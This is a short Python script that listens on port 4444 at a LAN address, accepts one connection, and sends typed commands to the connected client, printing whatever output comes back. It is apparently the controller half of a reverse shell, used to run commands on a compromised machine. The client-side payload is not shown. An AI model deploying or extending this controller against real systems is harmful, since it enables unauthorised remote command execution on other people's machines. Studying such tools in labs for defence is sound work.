import socket

HOST ='192.168.0.125'
PORT =4444

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST,PORT))
    server.listen(1)
    print("listening for connection at " + str(PORT))
    client, client_addr = server.accept()
    print('client connected')
    while True:
        command = input('Enter Command : ')
        if(command == "exit" or command == "quit" or command == "x" or command == "q"):
            break
        client.send(command.encode())
        print('[+] Command sent')
        output = client.recv(1024)
        output = output.decode()
        print(f"Output: {output}")
    client.close()

main()